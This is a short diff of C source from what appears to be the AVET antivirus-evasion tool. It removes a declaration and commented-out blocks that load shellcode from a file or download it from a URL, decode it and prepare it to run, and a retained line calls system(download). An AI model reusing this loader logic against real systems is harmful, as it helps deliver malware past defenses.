@@ -42,9 +42,7 @@ Web: https://github.com/govolution/avet
 
 
 unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size);
-#ifdef DOWNLOADEXECSC
-unsigned char* downloadshellcode(char* uri);
-#endif
+
 
 int main (int argc, char **argv)
 {		
@@ -89,84 +87,6 @@ int main (int argc, char **argv)
 	system(download);
 #endif		
 
-#ifdef UVALUE
-	int size = strlen(UVALUE);
-	uvalue=(char*)malloc(size);
-	strcpy(uvalue,UVALUE);
-#endif
-
-/*
-	// exec shellcode from a given file or from defs.h
-	if (fvalue)
-	{
-		unsigned char *buffer;
-		unsigned char *shellcode;
-		int size;
-//#ifndef FVALUE
-#ifdef LVALUE
-	#ifdef PRINT_DEBUG
-		printf("exec shellcode from file\n");
-	#endif
-		size = get_filesize(fvalue);
-		buffer = load_textfile(fvalue, buffer, size);
-#endif
-	#ifdef ENCRYPT 
-		#ifdef PRINT_DEBUG
-		printf ("size %d\n",size);
-		//printf ("%s\n",FVALUE);
-		printf("exec shellcode with decode_shellcode\n");
-		#endif
-		shellcode = decode_shellcode(buffer,shellcode,size);
-	#endif
-
-	#ifndef ENCRYPT
-		#ifdef LVALUE
-		unsigned char *buf = buffer; //that does the trick, although not nice. Needed for raw sc execution with -l
-		#endif
-	#ifndef ASCIIMSF 
-	#ifndef DOWNLOADEXECSC
-		#ifdef PRINT_DEBUG
-		printf("exec shellcode without decode_shellcode\n");
-		#endif
-		shellcode = buf;
-	#endif
-	#endif
-	#endif
-	}
-	
-*/
-	
-	
-	
-	// exec from url
-/*#ifdef UVALUE
-	else if (uvalue)
-	{
-		#ifdef PRINT_DEBUG
-			printf("exec shellcode from url\n");
-		#endif
-
-		char *sh_filename;
-		sh_filename = ie_download(uvalue, sh_filename);
-		int x=strlen(sh_filename);
-		
-#ifdef PRINT_DEBUG	
-		printf("\n\n%d\n\n", x);
-#endif
-
-		unsigned char *buffer;
-		unsigned char *shellcode;
-
-		int size = get_filesize(sh_filename);
-		buffer = load_textfile(sh_filename, buffer, size);
-#ifdef ENCRYPT
-		shellcode = decode_shellcode(buffer,shellcode,size);
-#else
-		shellcode = buf;
-#endif
-	}
-#endif
-*/
 	return 0;
 }
 
